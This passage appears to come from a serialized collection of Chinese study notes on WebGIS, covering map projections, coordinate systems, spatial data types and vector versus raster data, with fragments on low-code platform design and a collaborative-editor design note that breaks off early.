通过更多的客户开发者生产更多的==物料、服务==\n- 同时平台可以连接更多的物料、服务\n\n### 9.4. 连接存量的产品、存量的数据\n\n- 一个是==产品之前的连接==\n\t- 存量的 ERP/CRM 大而复杂的软件系统。\n\t- 越来越多小而灵活的应用产生\n\t- 企业的创新需求变化越来越快\n- 一个是**数据的连接**\n\t- 存量数据\n\t- 不能做成烟囱\n\n所以，==需要考虑之前的产品如何集成，数据如何迁移？==\n\n### 9.5. 灵活性和易用性的平台\n\n- 灵活性和易用性的平衡如果做不好，那**把平台做屎也很容易**\n- 太多先验经验，为了做成零代码，把平台搞成了**屎**\n\t- 复杂得没法维护\n\t- 产品体验差得不好意思说是我做的\n\n\n","1aYwOhR8":"\n# webgis 开发参考\n\n`#webgis` \n\n\n-  [OpenLayers3示例](http://develop.smaryun.com:81/API/JS/OL3InterfaceDemo/index.htm)\n-  Coordinate Systems Worldwide ： \n\t- 全球坐标体系\n\t-  [EPSG](https://epsg.io/)  code \n- 开放地理空间联盟(Open Geosspace Consortium，OGC)\n- 参考\n\t- [Fetching Title#uw47](https://mdnice.com/writing/6b3fbde39b5b4a5c841b8eaffedfbb22\n\t- [Geospatial Data Science with Julia - 1  What is geospatial data?](https://juliaearth.github.io/geospatial-data-science-with-julia/01-geodata.html)\n\n![image.png600|528](https://832-1310531898.cos.ap-beijing.myqcloud.com/202408061438328.png?imageSlim)\n\n[开源WebGIS在线教程 — Open Source WebGIS v 0.15 文档](http://webgis.cn/)\n\n- `Proj4js`：用于坐标转换\n- `OpenLayers`：内置了多种投影支持\n\n","H4ddii4L":"\n# 学习路径\n\n\n\n## 目录\n<!-- toc -->\n ## WebGIS开发的学习路径 \n\nWebGIS开发的学习路径可以分为几个阶段，我会为您提供一个循序渐进的学习计划：\n\n1. 基础知识阶段\n   a) GIS基础\n      - 学习基本的 GIS 概念\n      - 了解地图投影和坐标系统\n      - 熟悉空间数据类型（矢量和栅格）\n   b) Web开发基础\n      - HTML, CSS, JavaScript\n      - HTTP协议基础\n      - RESTful API设计\n   c) 地图数学基础\n      - 基本的地图代数\n      - 空间分析原理\n2. 工具和技术阶段\n   a) 地图库和框架\n      - Leaflet.js（入门级）\n      - OpenLayers（进阶）\n      - ArcGIS API for JavaScript（高级）\n   b) 后端技术\n      - 选择一种后端语言（如Python, Node.js, Java）\n      - 学习使用地理空间库（如GeoPandas, Turf.js）\n   c) 数据库\n      - 关系型数据库（PostgreSQL + PostGIS）\n      - NoSQL数据库（MongoDB）\n   d) GIS软件使用\n      - QGIS（开源）\n      - ArcGIS（商业）\n3. 服务和标准阶段\n   a) 地图服务\n      - GeoServer\n      - MapServer\n   b) OGC标准\n      - WMS (Web Map Service)\n      - WFS (Web Feature Service)\n      - WCS (Web Coverage Service)\n   c) 矢量瓦片\n      - Mapbox Vector Tiles\n      - OpenStreetMap tile servers\n4. 高级主题阶段\n   a) 空间分析\n      - 网络分析\n      - 地形分析\n      - 空间统计\n   b) 3D地图\n      - Cesium.js\n      - three.js\n   c) 大数据处理\n      - Apache Spark with GeoSpark\n      - Google Earth Engine\n   d) 实时GIS\n      - WebSocket\n      - 实时数据流处理\n5. 项目实践阶段\n   a) 基础项目\n      - 创建简单的Web地图应用\n      - 实现基本的空间查询功能\n   b) 中级项目\n      - 开发包含空间分析功能的应用\n      - 整合多种数据源的WebGIS系统\n   c) 高级项目\n      - 大规模WebGIS应用开发\n      - 结合机器学习的空间分析系统\n6. 持续学习和发展\n   a) 关注最新技术趋势\n      - 云GIS\n      - 物联网（IoT）与GIS的结合\n      - AR/VR在GIS中的应用\n   b) 参与开源项目\n   c) 参加GIS相关会议和研讨会\n\n学习资源：\n- 在线课程：Coursera, edX, Udemy上的GIS和Web开发课程\n- 书籍：《Web GIS: Principles and Applications》, 《Getting Started with GIS Programming》\n- 官方文档：各种地图库和GIS软件的官方文档\n- 社区：GIS Stack Exchange, GitHub上的相关项目\n- 博客和教程：Medium, Dev.to上的WebGIS相关文章\n\n记住，WebGIS是一个广泛的领域，需要不断学习和实践。从基础开始，逐步构建你的知识体系，通过实际项目来应用所学知识，这样可以更好地掌握WebGIS开发技能。\n\n","lzZYLHeu":"\n# 地图前端渲染\n\n`#webgis` \n\n\n## 目录\n<!-- toc -->\n ## mapbox \n\n- 地图 server  数据源\n\t- openStreet MAP\n\t\t- 免费 60 G  \n\t\t- 商业 90 G\n\t- 卫星地图数据\n\t\t- 186 G \n\t- 军事纹理、海拔数据\n\t\t- 盗版数据很少\n\t- 地形数据等\n\t- 地图 server  docker \n- 渲染\n\t- 瓦片传统渲染慢\n\t- json 的渲染方式快一些","bWEg1mln":"\n# 地图投影和坐标系统\n\n`#webgis` \n\n在WebGIS开发中，理解地图投影和坐标系统是非常重要的。这些概念直接影响到地图的显示、空间分析的精确度以及不同数据源的整合。让我为您详细展开这个主题：\n\n\n## 目录\n<!-- toc -->\n ## 1. 地球模型 \n\n- 首先，我们需要了解地球模型，因为它是坐标系统的基础：\n\t- 地球椭球体：近似表示地球形状的数学模型。常用的有WGS84、GRS80等。\n\t- 大地基准：定义地球椭球体相对于地球实际表面位置的参考系统。\n\n## 2. 坐标系统\n\n坐标系统分为两大类：\n\n### A. 地理坐标系统（GCS）\n\n   - 使用经度和纬度来定位。\n   - 基于三维椭球体模型。\n   - 常见的GCS：\n     * WGS84：GPS使用的全球标准\n     * NAD83：北美使用\n     * ETRS89：欧洲使用\n\n### B. 投影坐标系统（PCS）\n\n   - 将地球表面投影到平面上\n   - 使用X和Y坐标（通常以米为单位）\n   - 常见的PCS：\n     * UTM（通用横轴墨卡托）\n     * State Plane（美国使用）\n     * Web墨卡托（网络地图常用）\n\n## 3. 地图投影\n\n地图投影是将地球表面投影到平面上的数学方法。主要类型包括：\n\n### a) 圆柱投影\n\n   - 例如：墨卡托投影、UTM投影\n   - 特点：保持方向，但在高纬度地区严重变形\n\n### b) 圆锥投影\n\n   - 例如：兰伯特等角圆锥投影\n   - 特点：适合表示中纬度地区\n\n### c) 方位投影\n\n   - 例如：等距方位投影\n   - 特点：适合表示极地地区\n\n### d) 等面积投影\n\n   - 保持面积比例\n   - 例如：莫尔威德投影\n\n### e) 等角投影\n\n   - 保持局部形状\n   - 例如：墨卡托投影\n\n## 4. WebGIS中常用的投影\n\n### a) Web墨卡托（EPSG:3857）\n\n   - 最常用的网络地图投影\n   - Google Maps、OpenStreetMap等使用\n   - 基于墨卡托投影，但将地球视为球体而非椭球体\n\n### b) WGS84（EPSG:4326）\n\n   - 使用经纬度\n   - 常用于存储和交换地理数据\n\n## 5. 投影和坐标系统在WebGIS中的应用\n\n### a) 地图显示\n\n   - 选择合适的投影以最佳展示目标区域\n   - 处理跨越日期变更线的地图\n\n### b) 数据整合\n\n   - 确保所有数据层使用相同的坐标系统\n   - 进行必要的坐标转换\n\n### c) 空间分析\n\n   - 选择适合特定分析任务的投影（如等面积投影用于面积计算）\n\n### d) 性能优化\n\n   - 使用合适的投影可以提高渲染速度和减少数据变形\n\n### e) 用户交互\n\n   - 在不同投影间切换\n   - 显示坐标信息（经纬度或投影坐标）\n\n## 6. 坐标转换\n\n在WebGIS开发中，经常需要进行坐标转换：\n\na) 投影转换：在不同投影系统间转换\n\nb) 基准转换：在不同椭球体或基准间转换\n\n常用的JavaScript库：\n\n- `Proj4js`：用于坐标转换\n- `OpenLayers`：内置了多种投影支持\n\n## 7. 注意事项\n\na) 数据精度：不同投影可能导致精度损失\nb) 计算效率：某些投影可能需要更多计算资源\nc) 适用范围：选择适合特定地理区域的投影\nd) 标准遵循：遵循OGC等标准，确保互操作性\n\n## 8. 最佳实践\n\na) 始终明确指定和记录使用的坐标系统\nb) 在后端存储时优先使用地理坐标系统（如WGS84）\nc) 在前端显示时使用适合的投影坐标系统\nd) 了解你的数据和目标区域，选择最合适的投影\ne) 考虑用户需求，可能需要支持多种投影\n\n理解并正确处理投影和坐标系统是WebGIS开发的关键。它不仅影响地图的视觉表现，还直接关系到空间数据的精确性和分析结果的可靠性。随着项目的深入，你可能需要更深入地研究特定投影的特性和适用场景。","N5k8VHio":"\n# 地图投影的主要类型\n\n`#webgis` \n\n当然可以。让我用一些形象的比喻来解释不同的地图投影:\n\n\n## 目录\n<!-- toc -->\n ## 1. 圆柱投影（如墨卡托投影） \n\n想象一个透明的圆柱包裹着地球，地球中心有一盏灯。灯光将地球表面的特征投射到圆柱上。然后，我们将圆柱\"剪开\"并展平，这就形成了一张平面地图。\n\n- 优点：形状和方向保持得很好，尤其是在赤道附近。\n- 缺点：在高纬度地区会产生严重的面积扭曲。比如，格陵兰岛在墨卡托投影中显得比实际大得多。\n\n## 2. 圆锥投影（如兰伯特等角圆锥投影）\n\n想象一个纸质的圆锥帽子扣在地球上。我们将地球表面的特征投射到这个圆锥上，然后将圆锥展开成扇形。\n\n- 优点：适合表示中纬度地区，如美国或欧洲。\n- 缺点：在远离接触线的地方会产生扭曲。\n\n## 3. 方位投影（如等距方位投影）\n\n想象用一张平面纸轻轻触碰地球的一个点（通常是极点）。然后将地球表面的特征直接投射到这张纸上。\n\n- 优点：从中心点到任何其他点的距离和方向都是准确的。\n- 缺点：离中心点越远，扭曲越大。\n\n## 4. 等面积投影（如莫尔威德投影）\n\n想象一个可以变形的橡皮气球代表地球。我们小心地将这个气球挤压成一个扁平的形状，保证每部分的面积比例不变。\n\n- 优点：保持面积关系准确，适合比较不同地区的大小。\n- 缺点：形状可能会发生明显变形，特别是在地图边缘。\n\n## 5. 等角投影（如墨卡托投影也是等角的）\n\n想象你在地球表面画了一个小圆圈。无论这个圆圈投影到地图上的哪里，它总是保持圆形，不会变成椭圆。\n\n- 优点：保持局部形状，适合导航。\n- 缺点：不能同时保持面积准确，可能导致某些区域看起来比实际大得多。\n\n## 6. Web墨卡托投影（常用于在线地图）\n\n这是墨卡托投影的一个变种。想象你有一个略微缩小的透明地球仪，将它放入一个稍大的玻璃球中。然后用墨卡托投影的方法将这个玻璃球投影到平面上。\n\n- 优点：计算速度快，适合网络应用。\n- 缺点：仍然存在高纬度地区的严重变形问题。\n\n理解这些投影方式的关键是要记住，没有任何一种投影可以完美地将三维球体表面展示在二维平面上而不产生某种形式的扭曲。每种投影都是在准确性的不同方面（如形状、面积、距离、方向）之间做出的权衡。选择哪种投影取决于你的具体需求和你要表示的地理区域。","cIK4AdvQ":"\n# 空间数据类型\n\n\n**空间数据类型**是地理信息系统（GIS）和 WebGIS 应用中用来表示、存储和处理地理信息的**核心概念**。它们对地理要素或现象进行抽象，提供了对这些要素或现象进行分析和可视化的方法。我们可以将空间数据类型分为几大类，包括矢量数据、栅格数据、TIN（不规则三角网）数据、3D数据和时空数据等。\n\n下面详细展开介绍每种类型：\n\n\n## 目录\n<!-- toc -->\n ## 1. 矢量数据（Vector Data） \n\n矢量数据使用几何形状（点、线、面）来表示地理特征：\n\n- **点（Point）**：\n  - 用于表示地理位置。例如，城市、山峰、监测站等。\n  - 存储为单个坐标对（x, y 或者 x, y, z）。\n  - 应用示例：桥梁、车站、井点位置。\n\n- **线（Line 或 Polyline）**：\n  - 用于表示线性特征，如道路、河流等。\n  - 由一系列有序的点连接而成。\n  - 应用示例：高速公路、输电线、河道路径。\n\n- **面（Polygon）**：\n  - 用于表示有面积的区域，如湖泊、土地利用类型、行政区域等。\n  - 由闭合的线环定义。\n  - 应用示例：市区范围、森林区域、建筑轮廓。\n\n- **多点（MultiPoint）**：\n  - 表示多个相关但分离的点。\n  - 典型应用：一组河流上的监测点。\n\n- **多线（MultiLineString）**：\n  - 表示多条相关但不相连的线。\n  - 典型应用：分布在多个断续段落的公路网。\n\n- **多面（MultiPolygon）**：\n  - 表示多个相关但不相连的面。\n  - 典型应用：由多个岛屿组成的国家。\n\n## 2. 栅格数据（Raster Data）\n\n栅格数据通过**网格**来表示地理现象，每个网格单元（像素）有一个值：\n\n- **影像数据**：\n  - 包括卫星影像、航空照片等，每个像素表示一个光谱值。\n  - 应用广泛：土地覆盖、植被指数。\n- **数字高程模型（DEM）**：\n    - 每个像素表示一个地面的高程值。\n      - 应用广泛：地形分析、水文分析。\n- **专题栅格**：\n\t- 典型应用：土壤分类、气候区。\n\t- 每个像素值表示一个分类，如土地利用类型、水质等级等。\n\n## 3. TIN（Triangulated Irregular Network）数据\n\nTIN 使用不规则分布的点，通过三角形网来表示地形表面：\n\n- **组成**：\n  - 由一组节点和连接这些节点的三角形组成。\n  - 每个节点有 x, y, z 坐标。\n\n- **应用**：\n  - 地形可视化、土方量计算、坡度和坡向分析。\n\n## 4. 3D 数据\n\n用于表示三维空间中的地理要素：\n\n- **3D 点云（Point Cloud）**：\n  - 由激光雷达或摄影测量技术生成的一组三维点。\n  - 用于详细的地形建模、城市建模。\n\n- **3D 模型**：\n  - 可以表示建筑物、桥梁等详细结构。\n  - 常见格式：3D Tiles、glTF。\n\n## 5. 时空数据（Spatiotemporal Data）\n\n不仅记录地理位置，还包含时间维度的数据：\n\n- **时空轨迹**：\n  - 记录移动对象随时间变化的位置。\n  - 典型应用：交通流量分析、动物迁徙研究。\n\n- **时空光栅数据**：\n  - 包含多个时间步长的栅格数据。\n  - 典型应用：气象数据（温度、降雨量）。\n\n## 6. 拓扑数据（Topological Data）\n\n表示地理要素之间的空间关系（邻接、包含、连通等）：\n\n- **邻接关系**：\n  一个多边形邻接另一个多边形。\n\n- **连通性**：\n  一条线连接到另一条线或点。\n\n- **包含关系**：\n  一个多边形包含一个点或另一多边形。\n\n## 7. 元数据（Metadata）\n\n描述空间数据集的描述性信息：\n\n- **内容**：\n  - 数据源、采集时间、坐标系、数据精度、处理步骤等。\n\n- **用途**：\n  - 提供数据背景信息，确保数据的可理解性和可使用性。\n\n## 8. 空间数据存储格式\n\n空间数据通常以特定格式存储，每种格式有其独特的优点和适用场景：\n\n- **矢量数据格式**：\n  - **Shapefile**：广泛使用的矢量数据格式（存储点、线、面）。\n  - **GeoJSON**：基于 JSON 的格式，适合Web应用。\n  - **KML**：用于Google Earth的标记语言。\n  - **GML**：OGC标准的基于 XML 的格式。\n\n- **栅格数据格式**：\n  - **GeoTIFF**：支持地理参照的TIFF格式。\n  - **JPEG/PNG**：常用的图像格式（通常带有世界文件进行地理参照）。\n\n- **3D数据格式**：\n  - **3D Tiles**：用于大规模3D地理数据的流式传输和渲染。\n  - **glTF**：用于3D模型的高效传输和渲染。\n\n## 9. 空间数据分析与应用\n\n空间数据类型在不同的应用场景中发挥着重要作用：\n\n- **环境监测**：\n  - 通过分析影像数据和高程模型，可以监测环境变化，如冰川消退、森林砍伐等。\n\n- **城市规划**：\n  - 通过3D建模和矢量数据分析，可以进行城市建筑布局、交通网络规划、基础设施管理。\n\n- **灾害管理**：\n  - 利用时空数据进行灾害预测、应急响应和灾后恢复评估。\n\n- **资源管理**：\n  - 通过栅格和矢量数据，可以进行矿产资源评估、水资源管理、土地利用优化等。\n\n理解和掌握这些空间数据类型不仅是 GIS 和 WebGIS 开发人员的必备技能，也是进行有效地理数据分析和可视化的前提。正确使用和结合这些数据类型，可以显著提高地理分析和决策支持的准确性和效率。\n\n## 10. 空间数据类型的区别和使用场景\n\n### 10.1. 矢量数据\n\n#### 10.1.1. 特点\n\n- 使用点、线、面来表示离散的地理要素\n- 数据结构简单，文件大小相对较小\n- 可以精确表示边界和位置\n\n#### 10.1.2. 形象比喻\n\n想象你在一张地图上用别针标记城市（点），用线画出道路（线），用不同颜色的区域表示湖泊或国家边界（面）。这就是矢量数据的工作方式。\n\n#### 10.1.3. 使用场景\n\n- **城市规划**：用于绘制建筑物、道路、区域边界\n- **导航系统**：用于路径规划和导航\n- **环境监测**：用于标记污染源、监测站点位置\n- **资源管理**：用于界定矿区、农田、保护区\n\n---\n\n### 10.2. 栅格数据\n\n#### 10.2.1. 特点\n\n- 使用网格单元（像素）表示连续的地理现象\n- 每个像素包含一个值，表示该位置的属性\n- 适合表示连续变化的现象\n\n#### 10.2.2. 形象比喻\n\n想象你看到一幅油画，每个色块都由很多小色点（像素）构成。每个小色点都呈现出一个特定的颜色值，整体构成了完整的画面。这类似于栅格数据。\n\n#### 10.2.3. 使用场景\n\n- **遥感图像**：用于分析卫星影像和航空照片\n- **地形分析**：使用数字高程模型（DEM）进行坡度、坡向分析\n- **环境监测**：分析土地利用变化和植被覆盖\n- **气象数据**：对温度、降水量等空间分布进行分析和可视化\n\n---\n\n### 10.3. TIN（不规则三角网）数据\n\n#### 10.3.1. 特点\n\n- 由不规则分布的点连接成的三角形网络\n- 可以根据地形复杂程度调整点的密度\n- 比规则栅格更有效地表示复杂地形\n\n#### 10.3.2. 形象比喻\n\n想象你要用小三角形拼出山脉的地形。你会在山顶和山谷放置更多点，然后用三角形连接这些点，形成详细的地形表面。这种拼接方式就是TIN。\n\n#### 10.3.3. 使用场景\n\n- **地形建模**：创建高精度的地形模型\n- **工程测量**：进行坡度、体积计算\n- **水流模拟**：模拟水流路径和汇集区域\n- **视线分析**：确定从一点到另一点的可视性\n\n---\n\n### 10.4. 3D数据\n\n#### 10.4.1. 特点\n\n- 包含高度或深度信息的三维空间数据\n- 可以表示复杂的立体结构和表面\n\n#### 10.4.2. 形象比喻\n\n想象你在用积木搭建一个城市模型。你可以表示每栋建筑的高度、每条街道的宽度和形状。这是3D数据的工作方式。\n\n#### 10.4.3. 使用场景\n\n- **城市规划**：创建详细的城市3D模型\n- **建筑设计**：设计和可视化建筑物和基础设施\n- **虚拟现实**：用于创建沉浸式的虚拟环境\n- **地质建模**：表示地下地质结构\n\n---\n\n### 10.5. 时空数据\n\n#### 10.5.1. 特点\n\n- 结合了空间和时间维度的数据\n- 可以表示随时间变化的地理现象\n\n#### 10.5.2. 形象比喻\n\n想象你在看一部延时摄影视频，展示了从白天到黑夜的城市景象。你不仅能看到城市的布局（空间信息），还能看到随时间变化的交通流量和灯光（时间信息）。\n\n#### 10.5.3. 使用场景\n\n- **气候变化研究**：分析长期气温和降水模式\n- **交通流量分析**：研究不同时间段的交通状况\n- **人口迁移研究**：追踪人口移动模式\n- **环境监测**：跟踪污染物扩散或植被变化\n\n---\n\n### 10.6. 总结\n\n- **矢量数据**：适合表示具有明确边界和离散特征的地理要素，如道路、边界和兴趣点。\n- **栅格数据**：适合表示连续变化的现象，广泛用于遥感图像、地形图和环境监测。\n- **TIN数据**：适合精确地表示地形变化，用于高精度地形建模和分析。\n- **3D数据**：适合全面表示复杂的空间结构，如建筑物、地形和地下结构。\n- **时空数据**：适合分析地理现象和要素在时间维度上的动态变化，用于研究气候、交通和人口迁移等。\n\n选择合适的数据类型取决于具体的应用需求、数据特性和分析目标。不同的数据类型在实际应用中经常结合使用，以充分利用各自的优势。","AEx0qAGU":"\n# 地理要素的概念和属性\n\n当然，我会使用 Markdown 格式详细展开地理要素的概念和属性，并展示其层级关系。\n\n\n## 目录\n<!-- toc -->\n ## 1. 地理要素 \n\n### 1.1. 概念\n\n地理要素是 GIS 中表示现实世界地理实体的基本单位。\n\n- 定义：具有空间位置和属性特征的离散对象\n- 特点：\n  - 可识别性：每个要素都是唯一的\n  - 空间性：具有明确的地理位置或范围\n  - 属性性：携带描述性信息\n\n### 1.2. 类型\n\n#### 1.2.1. 点要素\n- 表示：单一坐标点\n- 示例：城市、兴趣点、树木\n\n#### 1.2.2. 线要素\n- 表示：一系列连接的点\n- 示例：道路、河流、输电线\n\n#### 1.2.3. 面要素\n- 表示：封闭的多边形区域\n- 示例：湖泊、行政区划、地块\n\n#### 1.2.4. 复合要素\n- 多点要素\n- 多线要素\n- 多面要素\n\n### 1.3. 属性\n\n属性是描述地理要素特征的信息。\n\n#### 1.3.1. 空间属性\n- 位置：坐标（x, y）或（经度，纬度）\n- 形状：点、线、面的几何形状\n- 大小：长度、面积、体积等\n- 方向：线要素的走向或面要素的朝向\n\n#### 1.3.2. 非空间属性\n\n##### 1.3.2.1. 描述性属性\n- 名称：要素的标识符\n- 类型：要素的分类\n- 数量：与要素相关的计数或测量值\n- 质量：描述要素状态的特征\n\n##### 1.3.2.2. 时间属性\n- 创建时间：要素被建立或记录的时间\n- 更新时间：要素信息最后被修改的时间\n- 历史时间：与要素历史相关的时间点\n- 动态时间：表示要素变化过程的时间序列\n\n##### 1.3.2.3. 关系属性\n- 拓扑关系：与其他要素的空间关系（邻接、包含等）\n- 网络关系：在网络结构中的连接性\n- 层次关系：在组织结构中的位置\n\n##### 1.3.2.4. 主题属性\n- 环境属性：如土壤类型、气候条件\n- 社会经济属性：如人口、GDP\n- 管理属性：如所有权、管辖权\n\n#### 1.3.3. 元数据\n\n- 数据来源：数据的采集方法和提供者\n- 精度信息：空间精度和属性精度\n- 坐标系统：使用的空间参考系统\n- 更新频率：数据的更新周期\n\n### 1.4. 要素操作\n\n#### 1.4.1. 空间操作\n\n- 缓冲区分析\n- 叠加分析\n- 网络分析\n\n#### 1.4.2. 属性操作\n\n- 查询\n- 统计\n- 分类\n\n#### 1.4.3. 可视化\n\n- 符号化：根据属性设置要素的视觉表现\n- 标注：在地图上显示要素的文字信息\n\n### 1.5. 要素集合\n\n#### 1.5.1. 要素类\n\n- 定义：同类型要素的集合\n- 特点：共享相同的属性结构\n\n#### 1.5.2. 图层\n- 定义：在GIS中组织和显示要素的方式\n- 类型：\n  - 矢量图层\n  - 栅格图层\n\n#### 1.5.3. 数据集\n- 定义：多个相关要素类的集合\n- 用途：组织复杂的地理数据\n\n通过这个结构化的概述，我们可以看到地理要素是如何在 GIS 中被定义、描述和组织的。理解这些概念和属性对于使用 OpenLayers 等地图库进行地理数据的处理和可视化至关重要。","IIsB2ekO":"\n# 空间数据类型\n\n\n空间数据类型是地理信息系统（GIS）和 WebGIS 开发中的**核心概念**。它们用于表示地理实体和现象。以下是主要的空间数据类型及其详细解释：\n\n\n## 目录\n<!-- toc -->\n ## 1. 矢量数据（Vector Data） \n   \n   使用点、线、面来表示离散的地理要素。\n   \n   a) 点（Point）：\n      -  表示单一位置，如城市、兴趣点等\n      -  存储为X、Y（有时包括Z）坐标\n      -  例如：GPS坐标、建筑物入口\n   b) 线（Line/Polyline）：\n      - 表示线性特征，如道路、河流等\n      - 由一系列有序的点组成\n      - 例如：道路网络、输电线路\n   c) 面（Polygon）：\n      - 表示有界区域，如湖泊、行政区划等\n      - 由闭合的线环定义\n      - 例如：土地利用区域、建筑物轮廓\n   d) 多点（MultiPoint）：\n      - 表示多个相关但分离的点\n      - 例如：连锁店位置\n   e) 多线（MultiLineString）：\n      - 表示多条相关但不相连的线\n      - 例如：群岛的海岸线\n   f) 多面（MultiPolygon）：\n      - 表示多个相关但不相连的面\n      - 例如：由多个岛屿组成的国家\n2. 栅格数据（Raster Data）：\n   使用网格单元（像素）来表示连续的地理现象。\n   a) 影像（Imagery）：\n      - 包括卫星图像、航空照片等\n      - 每个像素包含光谱信息\n\n   b) 数字高程模型（DEM）：\n      - 表示地形高程\n      - 每个像素值代表海拔高度\n   c) 专题栅格：\n      - 表示分类信息，如土地利用类型\n      - 每个像素值代表一个类别\n3. TIN（Triangulated Irregular Network）：\n   - 不规则三角网\n   - 用于表示地形的三维表面\n   - 由不规则分布的点连接成的三角形网络组成\n\n## 2. 时空数据\n   \n   包含时间维度的空间数据。\n   - 例如：气象数据、交通流量数据\n\n## 3. 3D数据\n\n   a) 3D点云：\n      - 由大量3D点组成\n      - 常用于激光雷达数据\n   b) 3D模型：\n      - 表示建筑物、地形等的三维结构\n      - 格式如3D Tiles、glTF等\n\n## 4. 网络数据\n\n   表示相互连接的线性要素。\n   - 例如：道路网络、公共交通网络\n\n## 5. 拓扑数据\n\n   描述空间要素之间的关系。\n   - 包括邻接关系、连通性等\n\n## 6. 属性数据\n\n   与空间数据关联的非空间信息。\n   - 例如：人口统计、土地利用类型等\n\n## 7. 元数据\n\n   描述数据集的数据。\n   - 包括数据来源、坐标系、精度等信息\n\n## 8. 不同数据的格式存储\n\n在WebGIS开发中，这些数据类型通常以特定的格式存储和传输：\n\n- 矢量数据：GeoJSON, KML, Shapefile, GML\n- 栅格数据：GeoTIFF, JPEG, PNG (带有地理参考)\n- 3D数据：3D Tiles, glTF, OBJ\n- 时空数据：NetCDF, HDF\n\n了解这些空间数据类型及其特性对于选择适当的数据结构、设计数据模型、实现数据处理和可视化等WebGIS开发任务至关重要。不同的数据类型适用于不同的分析和展示需求，合理使用可以提高WebGIS应用的性能和用户体验。\n\n## 9. 空间数据类型的区别和使用场景\n\n好的，我会尽量具体形象地解释这些数据类型的区别和使用场景。\n\n### 9.1. 矢量数据\n\n#### 9.1.1. 特点\n- 使用点、线、面来表示离散的地理要素\n- 数据结构简单，文件大小相对较小\n- 可以精确表示边界和位置\n\n#### 9.1.2. 形象比喻\n\n想象你在画一幅**简笔画**。你用点表示城市，用线表示道路，用多边形表示湖泊或国家边界。这就是矢量数据的工作方式。\n\n#### 9.1.3. 使用场景\n\n- 地图制作：绘制道路网络、行政边界\n- 空间分析：计算距离、面积、交叉点\n- 导航系统：路径规划和导航\n- 地理编码：将地址转换为坐标\n\n### 9.2. 栅格数据\n\n#### 9.2.1. 特点\n\n- 使用网格单元（像素）表示**连续的地理现象**\n- 每个像素包含一个值，表示该位置的属性\n- 适合表示连续变化的现象\n\n#### 9.2.2. 形象比喻\n\n想象一张像素化的照片。从远处看，你能看到完整的图像，但放大后，你会看到组成图像的一个个小方格。**每个方格就像一个数据点，包含特定信息**。\n\n#### 9.2.3. 使用场景\n\n- 遥感图像分析：卫星图像处理和分类\n- 地形分析：使用数字高程模型（DEM）进行坡度、坡向分析\n- 环境监测：分析植被覆盖、土地利用变化\n- 气象数据可视化：温度、降雨量分布图\n\n### 9.3. TIN（不规则三角网）数据\n\n#### 9.3.1. 特点\n\n- 由不规则分布的点连接成的三角形网络\n- 可以根据地形复杂程度调整点的密度\n- 比规则栅格更有效地表示复杂地形\n\n#### 9.3.2. 形象比喻\n\n想象你用橡皮泥制作地形模型。你会在重要的地形特征（如山顶、山谷）放置更多的点，而在平坦区域放置较少的点。然后用**三角形连接这些点，形成一个立体表面**。\n\n#### 9.3.3. 使用场景\n\n- 地形建模：创建高精度的地形模型\n- 水文分析：模拟水流路径和汇集区域\n- 视线分析：确定可视区域和遮蔽区域\n- 土方量计算：用于工程项目的挖填方估算\n\n### 9.4. 3D数据\n\n#### 9.4.1. 特点\n\n- 包含高度或深度信息的三维空间数据\n- 可以表示复杂的立体结构和表面\n\n#### 9.4.2. 形象比喻\n\n想象你在玩一个**3D建筑积木游戏**。你可以精确地表示建筑物的高度、形状，甚至内部结构。这就是3D数据的工作方式。\n\n#### 9.4.3. 使用场景\n\n- 城市规划：创建详细的3D城市模型\n- 建筑设计：设计和可视化建筑物\n- 虚拟现实：创建沉浸式的虚拟环境\n- 地质建模：表示地下地质结构\n\n### 9.5. 时空数据\n\n#### 9.5.1. 特点\n\n- 结合了空间和时间维度的数据\n- 可以表示随时间变化的地理现象\n\n#### 9.5.2. 形象比喻\n\n想象你在看一部**延时摄影视频**，展示了一个城市从白天到黑夜的变化。你不仅能看到城市的布局（空间信息），还能看到随时间变化的交通流量、灯光等（时间信息）。\n\n#### 9.5.3. 使用场景\n\n- 气候变化研究：分析长期气温和降水模式\n- 交通流量分析：研究不同时间段的交通状况\n- 人口迁移研究：追踪人口移动模式\n- 环境监测：跟踪污染物扩散或森林覆盖变化\n\n### 9.6. 总结\n\n- 矢量数据适合表示清晰边界和离散要素\n- 栅格数据适合表示连续变化的现象\n- TIN数据适合精确表示复杂地形\n- 3D数据适合表示立体结构和空间关系\n- 时空数据适合分析随时间变化的地理现象\n\n选择合适的数据类型取决于具体的应用需求、数据特性和分析目标。在实际应用中，这些数据类型经常结合使用，以充分利用各自的优势。","rYVTegpp":"\n# 矢量和栅格的区别？\n\n\n矢量和栅格这两个术语确实反映了它们在表示地理数据时的本质区别。让我们深入探讨一下：\n\n\n## 目录\n<!-- toc -->\n ## 矢量（Vector）和栅格（Raster）的字面含义 \n\n### 矢量（Vector）\n\n#### 字面解释\n\n\"矢量\"一词源自物理学和数学，表示具有大小和方向的量。\n\n#### 在地理信息系统中的含义\n\n- 表示具有精确位置和形状的离散要素\n- 使用数学方程来定义地理特征\n\n#### 形象理解\n\n想象你在用铅笔画一幅地图。你画点（城市），画线（道路），画多边形（湖泊）。每个要素都有明确的起点和终点，可以精确定位。\n\n### 栅格（Raster）\n\n#### 字面解释\n\n\"栅格\"一词源自印刷技术，指由规则排列的点或线组成的图案。\n\n#### 在地理信息系统中的含义\n\n- 表示连续的空间现象\n- 使用规则网格的单元（像素）来存储信息\n\n#### 形象理解\n\n想象你在看一幅由无数小方格组成的马赛克图片。每个小方格代表一个数据点，包含特定信息。\n\n## 主要区别\n\n### 数据结构\n\n- 矢量：用坐标来定义点、线、面\n- 栅格：用网格单元（像素）来表示空间\n\n### 表示方式\n\n- 矢量：适合表示离散的、有明确边界的要素\n- 栅格：适合表示连续变化的现象\n\n### 精度\n\n- 矢量：可以保持高精度，不受比例尺影响\n- 栅格：精度取决于像素大小（分辨率）\n\n### 文件大小\n\n- 矢量：通常文件较小，特别是对于简单的几何形状\n- 栅格：文件可能较大，尤其是高分辨率数据\n\n### 分析能力\n\n- 矢量：适合进行网络分析、几何运算\n- 栅格：适合进行连续表面分析、重分类\n\n## 总结\n\n矢量数据就像用铅笔画的精确地图，而栅格数据则像由小方格组成的数字照片。选择使用哪种类型取决于数据的性质和分析需求。在实际应用中，两种类型经常结合使用，以充分利用各自的优势。","AwHEO4ud":"\n# 前言\n\n\n> 常见的前端系统设计思路及注意事项\n\n","oHkSrThX":"\n# 在线协作文档设计\n\n`#系统设计` `#R1` \n\n\n## 目录\n<!-- toc -->\n ## 1. 业务图 \n\n![图片&文件](./files/20241114-1.png)\n\n## 2. 技术点\n\n- websocket\n- OT 引擎\n- 